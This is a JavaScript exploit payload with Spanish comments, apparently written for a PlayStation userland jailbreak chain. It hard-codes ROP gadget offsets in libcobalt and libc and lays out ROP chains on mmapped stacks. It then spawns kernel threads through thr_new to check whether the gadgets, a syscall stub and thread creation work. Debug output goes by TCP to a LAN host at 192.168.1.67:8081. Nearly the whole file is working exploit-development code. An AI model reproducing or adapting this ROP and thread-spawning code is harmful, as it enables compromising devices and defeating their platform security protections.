// 2026-08-27 rop_bisect3_1320: distingue thr_new RESTRINGIDO (Orbis mataria el proceso al llamarlo) vs rsp_inicial != top-8 (kernel Sony, RSP_OFFSET=0x10). Stack 0x400000 con TECHO=[top-8..top-64]=8x chainAddr: cualquier rsp_inicial ahi cae en una copia -> arranca la cadena.
// T: start=ret(cob+0x31,global.js L146)+[&pop_rsp,A] spin -> thr_new+entrada. T2 (si T no OK): start=pop_rax(cob+0x35942,DEMOSTRADO call_rop,L134)+misma spin. G: [&pop_rax,MARK,&pop_rdi,buf,&mov[rdi],rax,&pop_rsp,loop]->buf==MARK. S: STUB libc+0x19E34F getpid(20) sin TLS (=v2-C)->buf2=pid.
// LAYOUT: [top-64..top-8]=8x chainAddr (tolerancia rsp) | chainAddr=top-8-8*(8+Nq)<=top-72 (holgura) | cadena Nq qwords, ultima=A (loopback). Hilos VIVOS a proposito (spin inocuo; no thr_kill2/munmap). Canal: W() TCP 192.168.1.67:8081 + N() por test; polls acotados; cero lectura modulos.
(() => {
const B=(x)=>BigInt(x),I=(x)=>BigInt.asIntN(64,x);const WB=malloc(512);let sock=-1n;
const N=(s)=>{try{send_notification(s);}catch(e){}};
const W=(s)=>{if(sock<0n)return;try{const t=String(s)+"\n";let n=t.length;if(n>511)n=511;for(let i=0;i<n;i++)write8(WB+BigInt(i),t.charCodeAt(i)&255);syscall(SYSCALL.write,sock,WB,BigInt(n));}catch(e){}};
const CN=()=>{const s=I(syscall(SYSCALL.socket,2n,1n,0n));if(s<0n)return -1n;const a=malloc(16);write8(a,16);write8(a+1n,2);write16(a+2n,0x911Fn);write32(a+4n,0x4301A8C0n);write64(a+8n,0n);if(I(syscall(SYSCALL.connect,s,a,16n))<0n){syscall(SYSCALL.close,s);return -1n;}return s;};
try{sock=CN();if(sock<0n)sock=-1n;}catch(e){sock=-1n;}
const STK=0x400000n,MARK=0x4141414141414141n;let pid=0n;const g={};let okb=false;
if(typeof libcobalt_base!=="undefined"&&typeof libc_base!=="undefined"&&B(libcobalt_base)!==0n&&B(libc_base)!==0n){const c=B(libcobalt_base),L=B(libc_base);
g.pop_rsp=c+0x6f7c7n;g.pop_rax=c+0x35942n;g.pop_rdi=c+0x54bn;g.pop_rsi=c+0x26a5n;g.pop_rdx=c+0x81300n;g.pop_rcx=c+0x25e9n;g.pop_r8=c+0x35941n;g.pop_r9=c+0x3d9132n;g.mov_qword_rdi_rax=c+0x6fcecn;g.ret=c+0x31n;g.STUB=L+0x19E348n+7n;okb=true;}
// spawn TOLERANTE (unica T/T2/G/S): antes de thr_new, techo [top-8..top-64]=A x8: cualquier rsp_inicial del kernel ahi (RSP_OFFSET 0x10) manda la 1a ret/pop_rsp a A. Cadena: A=top-8-8*(8+Nq)<=top-72, ultima=A (loopback). tf: rip=sf, stack, ct=tid.
const spawn=(sf,ch)=>{
const base=I(syscall(SYSCALL.mmap,0n,STK,3n,MAP_PRIVATE|MAP_ANONYMOUS,B(-1),0n));
if(base<=0n){W("[bisect3] mmap stack ERR: "+get_error_string());return null;}
const top=base+STK,Nq=ch.length,A=top-8n-8n*(8n+B(Nq));
ch[Nq-1]=A;
for(let i=0;i<Nq;i++)write64(A+8n*B(i),ch[i]);
for(let k=1;k<=8;k++)write64(top-8n*B(k),A); // techo: 8x chainAddr
const tp=malloc(0x68);for(let i=0;i<0x68;i+=8)write64(tp+BigInt(i),0n);const ct=malloc(8);write64(ct,0n);
write64(tp,sf);write64(tp+8n,0n);write64(tp+0x10n,base);write64(tp+0x18n,STK);write64(tp+0x30n,ct);
const tr=I(syscall(SYSCALL.thr_new,tp,B(0x68)));
if(tr<0n){W("[bisect3] thr_new ERR: "+get_error_string());syscall(SYSCALL.munmap,base,STK);return null;}
const tid=B(read32(ct));if(tid===0n){W("[bisect3] tid=0");syscall(SYSCALL.munmap,base,STK);return null;}
return{base:base,A:A,tid:tid};};
// poll acotado: 50000 yields, read64 buf cada 32.
const poll=(buf)=>{for(let i=0;i<50000;i++){syscall(SYSCALL.sched_yield);if(i%32===0){const v=B(read64(buf));if(v!==0n)return v;}}return B(read64(buf));};
try{
try{pid=I(syscall(SYSCALL.getpid));}catch(e){}
W("[bisect3] pid="+toHex(pid)+" cob="+(okb?toHex(B(libcobalt_base)):"NO")+" libc="+(okb?toHex(B(libc_base)):"NO")+" STUB="+(okb?toHex(g.STUB):"?"));
if(!okb){W("[bisect3] ABORT: sin bases");N("[bisect3] abort no-bases");return;}
let rT="EX",rT2="EX",rG="EX",rS="EX";
// TEST T: start=ret (cob+0x31): 1a ret->[rsp_inicial]=A (relleno). [&pop_rsp,A] spin (se re-alimenta). Sobrevive 15000 yields -> thr_new OK. Sin notif T -> thr_new restringido o rsp imposible.
W("[bisect3] TEST T lanzando (start_func=ret cob+0x31)");
const cT=[g.pop_rsp,0n];
const tT=spawn(g.ret,cT);
if(!tT){rT="spawn-fallo";N("[bisect3] T=spawn-fallo");}else{
W("[bisect3] T tid="+tT.tid+" spin pop_rsp A="+toHex(tT.A));
for(let i=0;i<15000;i++)syscall(SYSCALL.sched_yield);
rT="OK";N("[bisect3] T=OK: thr_new+vuelve a userland");}
// TEST T2 (si T no OK): start=pop_rax (DEMOSTRADO call_rop): pop rax<-[rsp_inicial]=A (da igual), ret->[rsp_inicial+8]=otra copia -> misma spin. T muerto+T2 vivo => start_func; ambos muertos => thr_new restringido.
if(rT==="OK"){rT2="SKIP";W("[bisect3] TEST T2 omitido (T OK)");}else{
W("[bisect3] TEST T2 lanzando (start_func=pop_rax cob+0x35942)");
const cT2=[g.pop_rsp,0n];
const tT2=spawn(g.pop_rax,cT2);
if(!tT2){rT2="spawn-fallo";N("[bisect3] T2=spawn-fallo");}else{
W("[bisect3] T2 tid="+tT2.tid+" spin start=pop_rax A="+toHex(tT2.A));
for(let i=0;i<15000;i++)syscall(SYSCALL.sched_yield);
rT2="OK";N("[bisect3] T2=OK: start_func era el problema");}}
// start G/S: pop_rsp si T OK; si no pop_rax si T2 OK.
const sf=(rT==="OK")?g.pop_rsp:((rT2==="OK")?g.pop_rax:g.pop_rsp);const sfn=(sf===g.pop_rax)?"pop_rax":"pop_rsp";
// TEST G (=B v2): [&pop_rax,MARK,&pop_rdi,buf,&mov[rdi],rax,&pop_rsp,loop] bucle MARK->buf. Sin STUB.
W("[bisect3] TEST G lanzando (start_func="+sfn+")");
const buf=malloc(8);write64(buf,0n);
const cG=[g.pop_rax,MARK,g.pop_rdi,buf,g.mov_qword_rdi_rax,g.pop_rsp,0n];
const tG=spawn(sf,cG);
if(!tG){rG="spawn-fallo";N("[bisect3] G=spawn-fallo");}else{
W("[bisect3] G tid="+tG.tid+" bucle marker->buf A="+toHex(tG.A));
const v1=poll(buf);
if(v1===MARK){rG="OK";W("[bisect3] G=OK MARK en buf");N("[bisect3] G=OK");}
else{rG="FALLO";W("[bisect3] G=FALLO buf="+toHex(v1)+" (gadgets matan el hilo)");N("[bisect3] G=FALLO buf="+toHex(v1));}}
// TEST S (=TEST C v2): STUB libc+0x19E34F getpid(20) SIN TLS. rax=20 Y rdi=20 (cinturon p/ 2 semanticas).
W("[bisect3] TEST S lanzando (start_func="+sfn+")");
const buf2=malloc(8);write64(buf2,0n);
const cS=[g.pop_rax,20n,g.pop_rdi,20n,g.pop_rsi,0n,g.pop_rdx,0n,g.pop_rcx,0n,g.pop_r8,0n,g.pop_r9,0n,g.STUB,g.pop_rdi,buf2,g.mov_qword_rdi_rax,g.pop_rsp,0n];
const tS=spawn(sf,cS);
if(!tS){rS="spawn-fallo";N("[bisect3] S=spawn-fallo");}else{
W("[bisect3] S tid="+tS.tid+" bucle getpid(20) via STUB->buf2 A="+toHex(tS.A));
const v2=poll(buf2);
if(v2!==0n){rS="OK";W("[bisect3] S=OK STUB sin TLS pid_leido="+toHex(v2)+" match="+(v2===pid));N("[bisect3] S=OK pid="+toHex(v2)+" match="+(v2===pid));}
else{rS="FALLO";W("[bisect3] S=FALLO: STUB colgado/muerto (fs=0/TLS)");N("[bisect3] S=FALLO");}}
const resum="[bisect3] RESUMEN: T="+rT+" T2="+rT2+" G="+rG+" S="+rS+" (T=thr_new T2=start G=gadgets S=STUB)";W(resum);
// bucle resumen ~2min x40, <60ch banner
const nres=("[bisect3] T="+rT+" T2="+rT2+" G="+rG+" S="+rS).slice(0,59);
for(let i=0;i<40;i++){try{send_notification(nres);}catch(e){}for(let j=0;j<3000;j++)syscall(SYSCALL.sched_yield);}
// reenvio TCP del resumen x3:
for(let a=0;a<3;a++){sock=-1n;try{sock=CN();if(sock>=0n){W(resum);syscall(SYSCALL.close,sock);sock=-1n;}}catch(e){if(sock>=0n){try{syscall(SYSCALL.close,sock);}catch(e2){}sock=-1n;}}}
}catch(e){W("[bisect3] EX fatal: "+e);N("[bisect3] abort EX");}
try{if(sock>=0n)syscall(SYSCALL.close,sock);}catch(e){}
})();
